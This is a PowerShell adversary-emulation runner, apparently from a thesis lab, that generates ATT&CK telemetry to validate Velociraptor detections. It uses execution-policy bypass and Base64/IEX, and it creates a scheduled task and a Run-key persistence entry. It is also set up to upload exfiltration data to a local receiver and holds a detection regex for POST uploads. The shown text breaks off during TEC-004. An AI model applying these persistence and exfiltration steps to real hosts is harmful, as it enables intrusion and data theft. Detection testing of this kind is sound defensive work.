#Requires -RunAsAdministrator
<#
Candidate runner v4 for TFM Velociraptor validation.

Purpose:
- Execute TEC-001 to TEC-009 from the active VM path.
- Generate enough host telemetry to validate P4/P3/P2/P1 candidates.
- Execute TEC-009 through exfiltracion_v3.ps1, not inline staging.
- Keep all operations inside the controlled lab dataset.

Safety:
- Uses only dummy lab data.
- Sends upload only to the configured researcher-owned local receiver.
- Does not modify artifacts, router, Discord or technique scripts.

Usage:
  cd C:\Users\seguridad\Desktop\TFM\runner_candidate
  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
  $env:TFM_BASEPATH = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas"
  .\TFM_Run_All_TEC_Tests_v4.ps1 `
    -ReceiverUrl "http://192.168.1.129:8088/upload" `
    -EnableExfilUpload $true `
    -ExfilTimeoutSec 60 `
    -KeepExfilArtifacts $true

Parameter compatibility:
- EnableExfilUpload and KeepExfilArtifacts are bool parameters intentionally.
- Use `-EnableExfilUpload $true/$false` or `-EnableExfilUpload:$true/$false`.
- They are not switches because existing validation commands pass explicit booleans.
#>

param(
    [string]$BasePath = "",
    [string]$ReceiverUrl = "http://192.168.1.129:8088/upload",
    [int]$ExfilTimeoutSec = 60,
    [bool]$KeepExfilArtifacts = $true,
    [bool]$EnableExfilUpload = $true,
    [int]$PauseBetweenTestsSeconds = 10,
    [int]$ShortPauseSeconds = 2
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

if ([string]::IsNullOrWhiteSpace($BasePath)) {
    $BasePath = $env:TFM_BASEPATH
}
if ([string]::IsNullOrWhiteSpace($BasePath)) {
    $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas"
}
$env:TFM_BASEPATH = $BasePath

$DumbLab = Join-Path $BasePath "DUMB_LAB"
$ScriptPruebasDir = Join-Path $BasePath "SCRIPT_PRUEBAS"

$RansomDir = Join-Path $BasePath "TEC-007_Ransomware"
$SabotageDir = Join-Path $BasePath "TEC-008_Sabotaje"
$ExfilDir = Join-Path $BasePath "TEC-009_Exfiltracion"

$RestoreRansom = Join-Path $RansomDir "crear_directorio_dummy.ps1"
$RestoreSab = Join-Path $SabotageDir "crear_directorio_dummy.ps1"
$RestoreExfil = Join-Path $ExfilDir "crear_directorio_dummy.ps1"

$EnumScriptCandidates = @(
    (Join-Path $RansomDir "enumeracion_v2.ps1"),
    (Join-Path $RansomDir "enumeracion.ps1"),
    (Join-Path $ScriptPruebasDir "enumeracion_v2.ps1"),
    "C:\Users\seguridad\Desktop\TFM\scripts_candidate\enumeracion_v2.ps1"
)

$RansomScriptCandidates = @(
    (Join-Path $RansomDir "Scriptransom_v2.ps1"),
    (Join-Path $RansomDir "Scriptransom.ps1"),
    (Join-Path $ScriptPruebasDir "Scriptransom_v2.ps1"),
    "C:\Users\seguridad\Desktop\TFM\scripts_candidate\Scriptransom_v2.ps1"
)

$ExfilScript = Join-Path $ExfilDir "exfiltracion_v3.ps1"

$LogDir = Join-Path $BasePath "Logs_Pruebas_TFM"
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
$RunStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$LogFile = Join-Path $LogDir ("TFM_TEC_Run_CANDIDATE_v4_{0}.log" -f $RunStamp)
$SummaryTxt = Join-Path $LogDir ("TFM_TEC_Run_CANDIDATE_v4_{0}_summary.txt" -f $RunStamp)
$SummaryJson = Join-Path $LogDir ("TFM_TEC_Run_CANDIDATE_v4_{0}_summary.json" -f $RunStamp)
$SummaryCsv = Join-Path $LogDir ("TFM_TEC_Run_CANDIDATE_v4_{0}_summary.csv" -f $RunStamp)

$CampaignStart = Get-Date
$TechniqueResults = New-Object System.Collections.Generic.List[object]
$script:CurrentTechnique = $null
$script:ReceiverPrecheck = $null
$script:Tec009Details = [ordered]@{}

function Write-Step {
    param(
        [AllowEmptyString()][string]$Message = "",
        [string]$Level = "INFO"
    )

    if ([string]::IsNullOrWhiteSpace($Message)) {
        Write-Host ""
        Add-Content -Path $LogFile -Value ""
        return
    }

    $line = "[{0}] [{1}] {2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Level, $Message
    Write-Host $line
    Add-Content -Path $LogFile -Value $line
}

function Convert-ToInlineLog {
    param([AllowEmptyString()][string]$Text = "")
    if ([string]::IsNullOrWhiteSpace($Text)) { return "" }
    return ($Text.Trim() -replace "`r?`n", " | ")
}

function Join-TextList {
    param($Value)
    if ($null -eq $Value) { return "" }
    if ($Value -is [array]) { return ($Value -join "; ") }
    return [string]$Value
}

function Set-TechResult {
    param(
        [string]$ScriptExecuted,
        [string]$ScriptPath,
        [Nullable[int]]$ExitCode,
        [string[]]$ExpectedEvidence,
        [string[]]$FoundEvidence,
        [Nullable[int]]$SysmonRelevantEvents,
        [Nullable[int]]$PowerShell4104RelevantEvents,
        [ValidateSet("OK","WARN","FAIL")][string]$Status,
        [string]$Comment
    )

    if ($null -eq $script:CurrentTechnique) { return }
    if ($PSBoundParameters.ContainsKey("ScriptExecuted")) { $script:CurrentTechnique.ScriptExecuted = $ScriptExecuted }
    if ($PSBoundParameters.ContainsKey("ScriptPath")) { $script:CurrentTechnique.ScriptPath = $ScriptPath }
    if ($PSBoundParameters.ContainsKey("ExitCode")) { $script:CurrentTechnique.ExitCode = $ExitCode }
    if ($PSBoundParameters.ContainsKey("ExpectedEvidence")) { $script:CurrentTechnique.ExpectedEvidence = $ExpectedEvidence }
    if ($PSBoundParameters.ContainsKey("FoundEvidence")) { $script:CurrentTechnique.FoundEvidence = $FoundEvidence }
    if ($PSBoundParameters.ContainsKey("SysmonRelevantEvents")) { $script:CurrentTechnique.SysmonRelevantEvents = $SysmonRelevantEvents }
    if ($PSBoundParameters.ContainsKey("PowerShell4104RelevantEvents")) { $script:CurrentTechnique.PowerShell4104RelevantEvents = $PowerShell4104RelevantEvents }
    if ($PSBoundParameters.ContainsKey("Status")) { $script:CurrentTechnique.Status = $Status }
    if ($PSBoundParameters.ContainsKey("Comment")) { $script:CurrentTechnique.Comment = $Comment }
}

function Get-WinEventCountSafe {
    param(
        [Parameter(Mandatory=$true)][string]$LogName,
        [int[]]$Ids,
        [Parameter(Mandatory=$true)][datetime]$StartTime,
        [Parameter(Mandatory=$true)][datetime]$EndTime,
        [string]$MessageRegex = ""
    )

    try {
        $filter = @{
            LogName = $LogName
            StartTime = $StartTime
            EndTime = $EndTime
        }
        if ($Ids -and $Ids.Count -gt 0) { $filter.Id = $Ids }
        $events = Get-WinEvent -FilterHashtable $filter -ErrorAction Stop
        if (-not [string]::IsNullOrWhiteSpace($MessageRegex)) {
            $events = $events | Where-Object { ([string]$_.Message) -match $MessageRegex }
        }
        return @($events).Count
    }
    catch {
        return 0
    }
}

function Invoke-CmdLine {
    param(
        [Parameter(Mandatory=$true)][string]$Command,
        [string]$Description = "",
        [switch]$IgnoreExitCode
    )

    if ($Description) { Write-Step $Description }
    Write-Step ("CMD => {0}" -f $Command)

    $result = [ordered]@{
        Command = $Command
        ExitCode = -9999
        Stdout = ""
        Stderr = ""
    }

    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/d /c $Command"
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.CreateNoWindow = $false

        $p = New-Object System.Diagnostics.Process
        $p.StartInfo = $psi
        [void]$p.Start()

        $stdout = $p.StandardOutput.ReadToEnd()
        $stderr = $p.StandardError.ReadToEnd()
        $p.WaitForExit()

        $result.ExitCode = $p.ExitCode
        $result.Stdout = $stdout
        $result.Stderr = $stderr

        if ($stdout.Trim()) { Write-Step ("STDOUT => {0}" -f (Convert-ToInlineLog $stdout)) }
        if ($stderr.Trim()) { Write-Step ("STDERR => {0}" -f (Convert-ToInlineLog $stderr)) "WARN" }
        Write-Step ("ExitCode => {0}" -f $p.ExitCode)

        if (($p.ExitCode -ne 0) -and (-not $IgnoreExitCode)) {
            Write-Step ("Non-zero ExitCode: {0}" -f $p.ExitCode) "WARN"
        }
    }
    catch {
        $result.Stderr = $_.Exception.Message
        Write-Step ("ERROR executing command: {0}" -f $_.Exception.Message) "ERROR"
    }

    return [pscustomobject]$result
}

function Resolve-FirstExisting {
    param([Parameter(Mandatory=$true)][string[]]$Paths)
    foreach ($path in $Paths) {
        if (Test-Path -LiteralPath $path) { return $path }
    }
    return $null
}

function Invoke-PSFileIfExists {
    param(
        [Parameter(Mandatory=$true)][string]$ScriptPath,
        [string]$Description = "",
        [string]$Arguments = "",
        [switch]$IgnoreExitCode
    )

    if (Test-Path -LiteralPath $ScriptPath) {
        $cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{0}" {1}' -f $ScriptPath, $Arguments
        return Invoke-CmdLine -Command $cmd -Description $Description -IgnoreExitCode:$IgnoreExitCode
    }

    Write-Step ("Missing script: {0}" -f $ScriptPath) "ERROR"
    return [pscustomobject]@{ Command = ""; ExitCode = -404; Stdout = ""; Stderr = "Missing script" }
}

function Restore-DumbLab {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("Ransomware","Sabotaje","Exfiltracion","All")]
        [string]$Mode
    )

    Write-Step "Restoring controlled dataset. Mode: $Mode"

    switch ($Mode) {
        "Ransomware" {
            [void](Invoke-PSFileIfExists -ScriptPath $RestoreRansom -Description "Restore dataset from ransomware folder" -IgnoreExitCode)
        }
        "Sabotaje" {
            [void](Invoke-PSFileIfExists -ScriptPath $RestoreSab -Description "Restore dataset from sabotage folder" -IgnoreExitCode)
        }
        "Exfiltracion" {
            [void](Invoke-PSFileIfExists -ScriptPath $RestoreExfil -Description "Restore dataset from exfiltration folder" -IgnoreExitCode)
        }
        "All" {
            [void](Invoke-PSFileIfExists -ScriptPath $RestoreRansom -Description "Restore dataset from ransomware folder" -IgnoreExitCode)
            [void](Invoke-PSFileIfExists -ScriptPath $RestoreSab -Description "Restore dataset from sabotage folder" -IgnoreExitCode)
            [void](Invoke-PSFileIfExists -ScriptPath $RestoreExfil -Description "Restore dataset from exfiltration folder" -IgnoreExitCode)
        }
    }

    $currentFiles = @()
    if (Test-Path -LiteralPath $DumbLab) {
        $currentFiles = @(Get-ChildItem -LiteralPath $DumbLab -Recurse -File -ErrorAction SilentlyContinue)
    }

    if ((-not (Test-Path -LiteralPath $DumbLab)) -or $currentFiles.Count -lt 1) {
        Write-Step "DUMB_LAB missing or empty after restore. Creating minimal safe dummy dataset in active BasePath." "WARN"
        New-Item -ItemType Directory -Force -Path $DumbLab | Out-Null
        1..50 | ForEach-Object {
            Set-Content -Path (Join-Path $DumbLab ("dummy_{0}.txt" -f $_)) -Value ("dummy lab evidence {0}" -f $_)
        }
    }
}

function Assert-DumbLabSafe {
    $expected = Join-Path $BasePath "DUMB_LAB"
    if ($DumbLab -ne $expected) {
        throw "Unsafe DUMB_LAB path. Aborted."
    }
    if (-not (Test-Path -LiteralPath $DumbLab)) {
        throw "DUMB_LAB does not exist. Aborted."
    }
}

function Start-Test {
    param([Parameter(Mandatory=$true)][string]$Tec, [Parameter(Mandatory=$true)][string]$Name)
    $start = Get-Date
    $script:CurrentTechnique = [pscustomobject]@{
        TEC_ID = $Tec
        NameTactic = $Name
        ScriptExecuted = ""
        ScriptPath = ""
        ExitCode = $null
        Start = $start
        End = $null
        DurationSeconds = $null
        ExpectedEvidence = @()
        FoundEvidence = @()
        SysmonRelevantEvents = 0
        PowerShell4104RelevantEvents = 0
        Status = "OK"
        Comment = ""
    }
    Write-Step ""
    Write-Step "============================================================"
    Write-Step ("START {0} - {1}" -f $Tec, $Name)
    Write-Step ("TestStartUTC => {0}" -f $start.ToUniversalTime().ToString("o"))
    Write-Step "============================================================"
}

function End-Test {
    param([Parameter(Mandatory=$true)][string]$Tec)
    if ($null -ne $script:CurrentTechnique) {
        $end = Get-Date
        $script:CurrentTechnique.End = $end
        $script:CurrentTechnique.DurationSeconds = [math]::Round(($end - $script:CurrentTechnique.Start).TotalSeconds, 2)
        $TechniqueResults.Add($script:CurrentTechnique) | Out-Null
        $script:CurrentTechnique = $null
    }
    Write-Step ("END {0}" -f $Tec)
    Write-Step "============================================================"
    Start-Sleep -Seconds $PauseBetweenTestsSeconds
}

function Test-ReceiverEndpoint {
    param([Parameter(Mandatory=$true)][string]$Url)

    try {
        $uri = [uri]$Url
        $hostName = $uri.Host
        $port = $uri.Port
        if ($port -lt 1) {
            if ($uri.Scheme -eq "https") { $port = 443 } else { $port = 80 }
        }

        Write-Step ("TEC-009 receiver precheck: Test-NetConnection {0} -Port {1}" -f $hostName, $port)
        $ok = Test-NetConnection -ComputerName $hostName -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue
        Write-Step ("TEC-009 receiver reachable => {0}" -f $ok)
        $script:ReceiverPrecheck = [ordered]@{
            Url = $Url
            Host = $hostName
            Port = $port
            Reachable = [bool]$ok
            EnableExfilUpload = [bool]$EnableExfilUpload
            Status = if ($ok) { "OK" } elseif ($EnableExfilUpload) { "WARN" } else { "WARN" }
            Comment = if ($ok) { "Receiver reachable before TEC-009." } elseif ($EnableExfilUpload) { "Receiver unreachable while upload is enabled; TEC-009 upload may fail." } else { "Receiver unreachable but upload is disabled." }
        }

        if (-not $ok) {
            if ($EnableExfilUpload) {
                Write-Step "TEC-009 receiver is not reachable and EnableExfilUpload is true. Upload may fail." "WARN"
            }
            else {
                Write-Step "TEC-009 receiver is not reachable, but upload is disabled. Continuing." "WARN"
            }
        }

        return $ok
    }
    catch {
        Write-Step ("TEC-009 receiver precheck failed: {0}" -f $_.Exception.Message) "WARN"
        $script:ReceiverPrecheck = [ordered]@{
            Url = $Url
            Host = ""
            Port = ""
            Reachable = $false
            EnableExfilUpload = [bool]$EnableExfilUpload
            Status = "WARN"
            Comment = "Receiver precheck failed: $($_.Exception.Message)"
        }
        return $false
    }
}

function Get-ScriptBlockIdFromMessage {
    param([AllowEmptyString()][string]$Message = "")
    $match = [regex]::Match($Message, '(?im)ScriptBlock\s+ID:\s*([0-9a-fA-F-]+)')
    if ($match.Success) { return $match.Groups[1].Value }
    $match = [regex]::Match($Message, '(?im)ScriptBlockId["'']?\s*[:=]\s*["'']?([0-9a-fA-F-]+)')
    if ($match.Success) { return $match.Groups[1].Value }
    return ""
}

function Write-TEC009PowerShell4104Summary {
    param([Parameter(Mandatory=$true)][datetime]$RunStart)

    $startTime = [datetime]$RunStart
    Write-Step ("TEC-009 4104 query StartTime => {0}" -f $startTime.ToString("o"))
    $summary = [ordered]@{
        Count = 0
        Samples = @()
        QueryStatus = "OK"
        QueryError = ""
        Comment = ""
    }
    try {
        $rawEvents = @(Get-WinEvent -FilterHashtable @{
            LogName = 'Microsoft-Windows-PowerShell/Operational'
            Id = 4104
            StartTime = $startTime
        } -ErrorAction Stop)

        $events = @($rawEvents | Where-Object {
            $message = [string]$_.Message
            $message -match "Invoke-WebRequest|application/zip|\-InFile|\-Method\s+POST|exfiltracion_v3"
        })

        Write-Step ("TEC-009 matching 4104 events => {0}" -f $events.Count)
        $summary.Count = $events.Count

        $idx = 0
        $samples = New-Object System.Collections.Generic.List[object]
        foreach ($event in ($events | Select-Object -First 15)) {
            $idx++
            $message = [string]$event.Message
            $scriptBlockId = Get-ScriptBlockIdFromMessage -Message $message
            $sample = [ordered]@{
                TimeCreated = $event.TimeCreated.ToString("o")
                Id = $event.Id
                ScriptBlockId = $scriptBlockId
                InvokeWebRequest = [bool]($message -match "Invoke-WebRequest")
                ApplicationZip = [bool]($message -match "application/zip")
                InFile = [bool]($message -match "\-InFile|InFile")
                MethodPOST = [bool]($message -match "\-Method\s+POST|Method\s+POST|\bPOST\b")
                ExfiltracionV3 = [bool]($message -match "exfiltracion_v3")
            }
            $samples.Add([pscustomobject]$sample) | Out-Null
            Write-Step ("TEC-009 4104[{0}] TimeCreated={1}; Id={2}; ScriptBlockId={3}; InvokeWebRequest={4}; ApplicationZip={5}; InFile={6}; MethodPOST={7}" -f `
                $idx,
                $sample.TimeCreated,
                $sample.Id,
                $sample.ScriptBlockId,
                $sample.InvokeWebRequest,
                $sample.ApplicationZip,
                $sample.InFile,
                $sample.MethodPOST)
        }
        $summary.Samples = @($samples)
    }
    catch {
        $queryError = $_.Exception.Message
        Write-Step ("TEC-009 4104 QueryError => {0}" -f $queryError) "WARN"
        $summary.QueryStatus = "WARN"
        $summary.QueryError = $queryError
        $summary.Comment = $queryError
    }
    return [pscustomobject]$summary
}

function Write-ResultFieldFromOutput {
    param(
        [Parameter(Mandatory=$true)][string]$Name,
        [AllowEmptyString()][string]$Output = "",
        [Parameter(Mandatory=$true)][string]$Regex
    )

    $match = [regex]::Match($Output, $Regex, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
    if ($match.Success) {
        Write-Step ("{0} => {1}" -f $Name, $match.Groups[1].Value.Trim())
    }
    else {
        Write-Step ("{0} => not found in captured output" -f $Name) "WARN"
    }
}

function Write-CampaignSummary {
    param(
        [Parameter(Mandatory=$true)][datetime]$CampaignEnd
    )

    $duration = $CampaignEnd - $CampaignStart
    $okCount = @($TechniqueResults | Where-Object { $_.Status -eq "OK" }).Count
    $warnCount = @($TechniqueResults | Where-Object { $_.Status -eq "WARN" }).Count
    $failCount = @($TechniqueResults | Where-Object { $_.Status -eq "FAIL" }).Count
    $globalStatus = if ($failCount -gt 0) { "FAIL" } elseif ($warnCount -gt 0) { "WARN" } else { "OK" }

    $csvRows = foreach ($tech in $TechniqueResults) {
        [pscustomobject]@{
            TEC_ID = $tech.TEC_ID
            NameTactic = $tech.NameTactic
            ScriptExecuted = $tech.ScriptExecuted
            ScriptPath = $tech.ScriptPath
            ExitCode = $tech.ExitCode
            Start = if ($tech.Start) { $tech.Start.ToString("o") } else { "" }
            End = if ($tech.End) { $tech.End.ToString("o") } else { "" }
            DurationSeconds = $tech.DurationSeconds
            ExpectedEvidence = Join-TextList $tech.ExpectedEvidence
            FoundEvidence = Join-TextList $tech.FoundEvidence
            SysmonRelevantEvents = $tech.SysmonRelevantEvents
            PowerShell4104RelevantEvents = $tech.PowerShell4104RelevantEvents
            Status = $tech.Status
            Comment = $tech.Comment
        }
    }

    $summaryObject = [ordered]@{
        Campaign = [ordered]@{
            Start = $CampaignStart.ToString("o")
            End = $CampaignEnd.ToString("o")
            DurationSeconds = [math]::Round($duration.TotalSeconds, 2)
            Hostname = $env:COMPUTERNAME
            User = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
            ScriptExecuted = $MyInvocation.MyCommand.Name
            RunnerPath = $PSCommandPath
            BasePath = $BasePath
            LogFile = $LogFile
            SummaryTxt = $SummaryTxt
            SummaryJson = $SummaryJson
            SummaryCsv = $SummaryCsv
            ReceiverUrl = $ReceiverUrl
            ReceiverPrecheck = $script:ReceiverPrecheck
            GlobalStatus = $globalStatus
            TechniquesOK = $okCount
            TechniquesWARN = $warnCount
            TechniquesFAIL = $failCount
        }
        TEC009 = $script:Tec009Details
        Techniques = @($TechniqueResults)
    }

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("TFM TEC RUN CANDIDATE v4 SUMMARY") | Out-Null
    $lines.Add("============================================================") | Out-Null
    $lines.Add(("Start: {0}" -f $CampaignStart.ToString("o"))) | Out-Null
    $lines.Add(("End: {0}" -f $CampaignEnd.ToString("o"))) | Out-Null
    $lines.Add(("DurationSeconds: {0}" -f [math]::Round($duration.TotalSeconds, 2))) | Out-Null
    $lines.Add(("Hostname: {0}" -f $env:COMPUTERNAME)) | Out-Null
    $lines.Add(("User: {0}" -f ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name))) | Out-Null
    $lines.Add(("RunnerPath: {0}" -f $PSCommandPath)) | Out-Null
    $lines.Add(("BasePath: {0}" -f $BasePath)) | Out-Null
    $lines.Add(("LogFile: {0}" -f $LogFile)) | Out-Null
    $lines.Add(("ReceiverUrl: {0}" -f $ReceiverUrl)) | Out-Null
    $lines.Add(("ReceiverPrecheck: {0}" -f (ConvertTo-Json -InputObject $script:ReceiverPrecheck -Compress))) | Out-Null
    $lines.Add(("GlobalStatus: {0}" -f $globalStatus)) | Out-Null
    $lines.Add(("Techniques OK/WARN/FAIL: {0}/{1}/{2}" -f $okCount, $warnCount, $failCount)) | Out-Null
    $lines.Add("") | Out-Null
    $lines.Add("Technique results") | Out-Null
    $lines.Add("------------------------------------------------------------") | Out-Null
    foreach ($tech in $TechniqueResults) {
        $lines.Add(("{0} | {1} | Status={2} | ExitCode={3} | Sysmon={4} | PS4104={5}" -f $tech.TEC_ID, $tech.NameTactic, $tech.Status, $tech.ExitCode, $tech.SysmonRelevantEvents, $tech.PowerShell4104RelevantEvents)) | Out-Null
        $lines.Add(("  Start: {0}" -f $(if ($tech.Start) { $tech.Start.ToString("o") } else { "" }))) | Out-Null
        $lines.Add(("  End: {0}" -f $(if ($tech.End) { $tech.End.ToString("o") } else { "" }))) | Out-Null
        $lines.Add(("  DurationSeconds: {0}" -f $tech.DurationSeconds)) | Out-Null
        $lines.Add(("  Script: {0}" -f $tech.ScriptExecuted)) | Out-Null
        $lines.Add(("  ScriptPath: {0}" -f $tech.ScriptPath)) | Out-Null
        $lines.Add(("  ExpectedEvidence: {0}" -f (Join-TextList $tech.ExpectedEvidence))) | Out-Null
        $lines.Add(("  FoundEvidence: {0}" -f (Join-TextList $tech.FoundEvidence))) | Out-Null
        $lines.Add(("  Comment: {0}" -f $tech.Comment)) | Out-Null
    }

    $lines | Set-Content -LiteralPath $SummaryTxt -Encoding UTF8
    $summaryObject | ConvertTo-Json -Depth 8 | Set-Content -LiteralPath $SummaryJson -Encoding UTF8
    $csvRows | Export-Csv -LiteralPath $SummaryCsv -NoTypeInformation -Encoding UTF8

    Write-Step ("Summary TXT => {0}" -f $SummaryTxt)
    Write-Step ("Summary JSON => {0}" -f $SummaryJson)
    Write-Step ("Summary CSV => {0}" -f $SummaryCsv)

    Write-Host ""
    Write-Host "CAMPAIGN FINISHED"
    Write-Host ("Global result: {0}" -f $globalStatus)
    Write-Host ("Full log: {0}" -f $LogFile)
    Write-Host ("Summary TXT: {0}" -f $SummaryTxt)
    Write-Host ("Summary JSON: {0}" -f $SummaryJson)
    Write-Host ("Summary CSV: {0}" -f $SummaryCsv)
    Write-Host ("Techniques OK/WARN/FAIL: {0}/{1}/{2}" -f $okCount, $warnCount, $failCount)

    return $summaryObject
}

Write-Step "Starting candidate campaign v4 P4/P3/P2/P1 evidence run"
Write-Step ("Log: {0}" -f $LogFile)
Write-Step ("BasePath: {0}" -f $BasePath)
Write-Step ("DUMB_LAB: {0}" -f $DumbLab)
Write-Step ("ReceiverUrl: {0}" -f $ReceiverUrl)
Write-Step ("EnableExfilUpload: {0}" -f $EnableExfilUpload)
Write-Step ("ExfilTimeoutSec: {0}" -f $ExfilTimeoutSec)
Write-Step ("KeepExfilArtifacts: {0}" -f $KeepExfilArtifacts)

if (-not (Test-Path -LiteralPath $BasePath)) { throw "BasePath does not exist: $BasePath" }

$EnumScript = Resolve-FirstExisting -Paths $EnumScriptCandidates
$RansomScript = Resolve-FirstExisting -Paths $RansomScriptCandidates

Write-Step ("Resolved EnumScript: {0}" -f $(if ($EnumScript) { $EnumScript } else { "NOT FOUND" }))
Write-Step ("Resolved RansomScript: {0}" -f $(if ($RansomScript) { $RansomScript } else { "NOT FOUND" }))
Write-Step ("Expected ExfilScript: {0}" -f $ExfilScript)

[void](Invoke-CmdLine -Command 'schtasks.exe /delete /tn "TFM-TEC-003" /f' -Description "Pre-clean scheduled task" -IgnoreExitCode)
[void](Invoke-CmdLine -Command 'sc.exe delete "TFM TEC005 Test Service"' -Description "Pre-clean service" -IgnoreExitCode)
[void](Invoke-CmdLine -Command 'reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f' -Description "Pre-clean RunKey" -IgnoreExitCode)

Restore-DumbLab -Mode "All"

Start-Test -Tec "TEC-001" -Name "PowerShell / T1059.001"
$tec001a = Invoke-CmdLine -Command 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"' -Description "TEC-001 PowerShell Bypass/NoProfile"
$tec001b = Invoke-CmdLine -Command 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(''TEC001_BASE64_OK'')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX ''Write-Host TEC001_IEX_OK''; Start-Sleep 2"' -Description "TEC-001 PowerShell FromBase64String and IEX evidence"
$tec001End = Get-Date
Set-TechResult `
    -ScriptExecuted "powershell.exe" `
    -ScriptPath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
    -ExitCode $tec001b.ExitCode `
    -ExpectedEvidence @("PowerShell process", "ExecutionPolicy Bypass", "FromBase64String", "IEX", "4104 if ScriptBlock logging is enabled") `
    -FoundEvidence @("Command A ExitCode=$($tec001a.ExitCode)", "Command B ExitCode=$($tec001b.ExitCode)", "Stdout=$((Convert-ToInlineLog $tec001b.Stdout))") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1) -StartTime $script:CurrentTechnique.Start -EndTime $tec001End -MessageRegex 'powershell|pwsh') `
    -PowerShell4104RelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-PowerShell/Operational' -Ids @(4104) -StartTime $script:CurrentTechnique.Start -EndTime $tec001End -MessageRegex 'ExecutionPolicy|FromBase64String|IEX|TEC001') `
    -Status $(if ($tec001a.ExitCode -eq 0 -and $tec001b.ExitCode -eq 0) { "OK" } else { "WARN" }) `
    -Comment "PowerShell execution evidence generated for CU-001."
End-Test -Tec "TEC-001"

Start-Test -Tec "TEC-002" -Name "Windows Command Shell / T1059.003"
$tec002 = Invoke-CmdLine -Command 'cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"' -Description "TEC-002 cmd.exe chaining and PowerShell child"
$tec002End = Get-Date
Set-TechResult `
    -ScriptExecuted "cmd.exe" `
    -ScriptPath "C:\Windows\System32\cmd.exe" `
    -ExitCode $tec002.ExitCode `
    -ExpectedEvidence @("cmd.exe /c", "command chaining", "PowerShell child process", "Sysmon ID 1") `
    -FoundEvidence @("ExitCode=$($tec002.ExitCode)", "Stdout=$((Convert-ToInlineLog $tec002.Stdout))") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1) -StartTime $script:CurrentTechnique.Start -EndTime $tec002End -MessageRegex 'cmd\.exe|powershell|TEC002') `
    -PowerShell4104RelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-PowerShell/Operational' -Ids @(4104) -StartTime $script:CurrentTechnique.Start -EndTime $tec002End -MessageRegex 'Get-Process|TEC002') `
    -Status $(if ($tec002.ExitCode -eq 0) { "OK" } else { "WARN" }) `
    -Comment "Windows command shell evidence with PowerShell child process."
End-Test -Tec "TEC-002"

Start-Test -Tec "TEC-003" -Name "Scheduled Task / T1053.005"
$taskTime = (Get-Date).AddMinutes(5).ToString("HH:mm")
$tec003Create = 'schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st {0} /f' -f $taskTime
$tec003CreateResult = Invoke-CmdLine -Command $tec003Create -Description "TEC-003 create scheduled task"
Start-Sleep -Seconds $ShortPauseSeconds
$tec003QueryResult = Invoke-CmdLine -Command 'schtasks.exe /query /tn "TFM-TEC-003" /v /fo list' -Description "TEC-003 query scheduled task" -IgnoreExitCode
Start-Sleep -Seconds $ShortPauseSeconds
$tec003RunResult = Invoke-CmdLine -Command 'schtasks.exe /run /tn "TFM-TEC-003"' -Description "TEC-003 run scheduled task" -IgnoreExitCode
Start-Sleep -Seconds $ShortPauseSeconds
$tec003DeleteResult = Invoke-CmdLine -Command 'schtasks.exe /delete /tn "TFM-TEC-003" /f' -Description "TEC-003 delete scheduled task" -IgnoreExitCode
$tec003End = Get-Date
Set-TechResult `
    -ScriptExecuted "schtasks.exe" `
    -ScriptPath "C:\Windows\System32\schtasks.exe" `
    -ExitCode $tec003CreateResult.ExitCode `
    -ExpectedEvidence @("schtasks create", "schtasks run", "schtasks delete", "Security 4698/4699 if audited", "Sysmon ID 1") `
    -FoundEvidence @("CreateExit=$($tec003CreateResult.ExitCode)", "QueryExit=$($tec003QueryResult.ExitCode)", "RunExit=$($tec003RunResult.ExitCode)", "DeleteExit=$($tec003DeleteResult.ExitCode)") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1) -StartTime $script:CurrentTechnique.Start -EndTime $tec003End -MessageRegex 'schtasks|TFM-TEC-003') `
    -PowerShell4104RelevantEvents 0 `
    -Status $(if ($tec003CreateResult.ExitCode -eq 0) { "OK" } else { "WARN" }) `
    -Comment "Scheduled task lifecycle generated; run/delete may be noisy but create is primary evidence."
End-Test -Tec "TEC-003"

Start-Test -Tec "TEC-004" -Name "Registry Run Key / T1547.001"
$tec004Add = Invoke-CmdLine -Command 'reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f' -Description "TEC-004 create Run key"
Start-Sleep -Seconds $ShortPauseSeconds
$tec004Query = Invoke-CmdLine -Command 'reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"' -Description "TEC-004 query Run key" -IgnoreExitCode
Start-Sleep -Seconds $ShortPauseSeconds
